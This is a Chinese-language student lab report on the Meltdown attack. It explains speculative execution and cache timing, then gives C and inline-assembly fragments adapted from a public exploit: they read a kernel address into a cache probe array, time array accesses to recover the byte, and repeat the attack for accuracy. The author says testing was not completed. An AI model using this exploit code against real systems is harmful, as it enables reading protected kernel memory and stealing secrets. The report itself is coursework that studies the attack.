## Lab 04 实验报告
### 一、原理分析

```assembly
; 以下代码样例摘自博客：https://paper.seebug.org/499/

; rcx = a protected kernel memory address
; rbx = address of a large array in large space

mov al, byte [ rcx ] ; read from forbidden kernel address
shl rax, 0xc  ; multiply the result from the read operation with 4096
mov rbx, qword [ rbx + rax ] ; touch the user space array at the offset that we just calculated

```

这段代码从理论上看没有任何问题，因为用户态程序在执行第一行代码时，会因为访问内核地址空间而产生异常，从而使得用户态程序既读取不到rcx所指向的内核态地址空间，也无法执行后两行代码。

虽然理论上上述代码不会产生什么问题，但由于现代CPU处理器乱序执行和预测执行的特性，代码的实际执行顺序可能与编写程序时的代码顺序有所不同。

在上述代码的实际执行过程中，第一条MOV指令除了将rcx指向的内核态地址下的数据放到al之中外，还会检查进程是否有权限访问该地址。由于这种权限检查是一个相对耗费资源的操作，因此CPU在al取到[rcx]内核数据后并不会等待权限检查结束，而是继续往后执行第二条和第三条指令。在第二条指令计算了`rax=al*4096`之后，第三条指令会以rbx为基址、`al*4096`为偏移量来获取用户态数组中的某一项数据。

在第三条指令执行时，`rbx[al*4096]`将会被加载到cache当中。因此导致攻击者之后以n（0<=n<=255）遍历数组`rbx[]`时，`rbx[al*4096]`项的加载时间将会远小于数组其他项的加载时间。通过对加载时间的分析，就可以推断出al的具体值，从而间接获得rcx所指向内核数据（byte [rcx]）的值。



 ### 二、主要代码

### 代码的meltdown攻击部分主要由三块组成

- 漏洞利用：通过内嵌汇编代码，将需要窃取的内核信息作为数组下标，将数组中相应的项加载到cache中

  ```C
  load_cache(char* addr)//将待窃取的内核地址数据load到cache中
  
  {   //此代码引用自https://github.com/paboldin/meltdown-exploit/blob/master/meltdown.c
      asm volatile (
  
          "1:\n\t"
  
          ".rept 300\n\t"
          "add $0x141, %%rax\n\t"
          ".endr\n\t"
  
          "movzx (%[addr]), %%eax\n\t"
          "shl $12, %%rax\n\t"
          "jz 1b\n\t"
          "mov (%[target], %%rax, 1), %%rbx\n"
  
          "stopspeculate: \n\t"
          "nop\n\t"
          :
          : [target] "r" (hist),
            [addr] "r" (addr)
          : "rax", "rbx"
      );
  }
  ```

  

- 数组遍历：对数组进行遍历，通过计算数组不同项的读取速度，判断数组中哪一块被调入cache中，进而判断所窃取的内核信息数值

  ```C
  int  get_value(){  //获取被攻击地址的值
      //此代码是在https://github.com/paboldin/meltdown-exploit/blob/master/meltdown.c上略作改动
      int i, time, mix_i, min_pos, min_time = MINTIME;
      volatile char *addr;
  
      for (i = 0; i < VARIANTS_READ; i++ ){//找到数组中被加载到cache中的那一块
  
          mix_i=((i * 167) + 13) & 255;
          addr = &hist[PAGESIZE * mix_i];
          time = get_access_time( addr );
  
          if (min_time > time){
              min_time = time;
              min_pos= mix_i;
          }
      }
      return min_pos;
  }
  ```

  

- 重复攻击：对同一个内核地址的信息进行多次窃取，以提升窃取成功的概率

   

  ```C
  for (int i = 0; i < CYCLES; i++ ){
              once = attack(fd, addr) ;
              score[ once ]++;
          }//对同一地址进行多次攻击，以保证结果的准确性
          value[ j ] = ensure_value( score );//认为得到次数最多的值作为被攻击地址下的确切值
          addr++;
  
  ```

  

*注：

- 本次实验时间较为紧张，将主要的时间花在了对meltdown原理的调研和对meltdown攻击代码的设计上；因此没能及时安装老版本的操作系统也没有找到在现有操作系统上关闭meltdown补丁的可行的方法，故代码测试部分并没有全部完成。
- 攻击代码主要参考自：https://github.com/paboldin/meltdown-exploit/blob/master/meltdown.c

